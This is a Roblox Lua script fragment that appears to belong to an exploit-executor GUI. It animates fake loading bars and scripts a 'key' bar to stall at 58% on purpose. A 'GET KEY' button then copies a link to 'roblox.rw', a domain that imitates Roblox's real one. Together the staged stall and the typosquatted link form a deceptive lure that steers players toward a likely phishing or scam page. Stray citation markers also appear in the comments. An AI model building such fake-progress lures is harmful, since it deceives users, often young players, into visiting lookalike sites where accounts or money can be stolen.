-- ▸ Loading animation
local function animateBar(bar, pctLabel, targetPercent, duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local goal = { Size = UDim2.new(targetPercent / 100, 0, 1, 0) }  -- tween the fill size[reference:1]
    local tween = TweenService:Create(bar, tweenInfo, goal)
    tween:Play()

    -- Update the percentage label
    local steps = 20
    for i = 1, steps do
        task.wait(duration / steps)
        local value = math.floor((i / steps) * targetPercent)
        pctLabel.Text = value .. "%"
    end
end

-- Start the loading sequence when the panel opens
local function runLoadingSequence()
    -- Reset
    barLoad.Size = UDim2.new(0, 0, 1, 0)
    barConn.Size = UDim2.new(0, 0, 1, 0)
    barKey.Size  = UDim2.new(0, 0, 1, 0)
    pctLoad.Text = "0%"
    pctConn.Text = "0%"
    pctKey.Text  = "0%"
    keyNote.Visible = false

    -- Row 1 – Loading (100%)
    animateBar(barLoad, pctLoad, 100, 0.9)
    task.wait(1.0)
    pctLoad.Text = "100%"

    -- Row 2 – Connecting (100%)
    animateBar(barConn, pctConn, 100, 0.8)
    task.wait(0.9)
    pctConn.Text = "100%"

    -- Row 3 – Key (stuck at 58%)
    animateBar(barKey, pctKey, 58, 0.7)
    task.wait(0.8)
    pctKey.Text = "58%"
    keyNote.Visible = true
end

-- ▸ Clipboard copy
local LINK = "https://www.roblox.rw/communities/798537981879/bname"

local function copyLink()
    -- setclipboard is available in executors; fallback to toclipboard or set_clipboard
    local clipboardFunc = setclipboard or toclipboard or set_clipboard
    if clipboardFunc then
        clipboardFunc(LINK)  -- copies the link[reference:2]
        getKeyBtn.Text = "COPIED!"
        task.wait(1.5)
        getKeyBtn.Text = "GET KEY"
    else
        warn("Clipboard not supported in this environment.")
    end
end

